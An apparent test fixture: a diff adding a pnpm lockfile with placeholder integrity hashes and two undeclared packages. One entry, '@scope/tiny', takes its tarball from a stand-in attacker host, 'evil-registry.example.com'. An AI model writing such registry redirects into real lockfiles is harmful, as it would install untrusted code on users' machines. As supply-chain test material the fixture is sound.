@@ -1,0 +1,37 @@
+lockfileVersion: '9.0'
+
+settings:
+  autoInstallPeers: true
+  excludeLinksFromLockfile: false
+
+importers:
+  .:
+    dependencies:
+      esbuild:
+        specifier: ^0.25.0
+        version: 0.25.0
+    devDependencies:
+      vitest:
+        specifier: ^2.0.0
+        version: 2.0.0
+
+packages:
+  esbuild@0.25.0:
+    resolution: {integrity: sha512-HEADesbuild==}
+    engines: {node: '>=18'}
+    hasBin: true
+
+  '@scope/tiny@2.0.0':
+    resolution: {integrity: sha512-BAStiny==, tarball: https://evil-registry.example.com/@scope/tiny/-/tiny-2.0.0.tgz}
+
+  obscure-helper@0.0.1:
+    resolution: {integrity: sha512-HEADobscure==}
+
+  vitest@2.0.0:
+    resolution: {integrity: sha512-BASEvitest==}
+
+snapshots:
+  esbuild@0.25.0: {}
+  '@scope/tiny@2.0.0': {}
+  obscure-helper@0.0.1: {}
+  vitest@2.0.0: {}
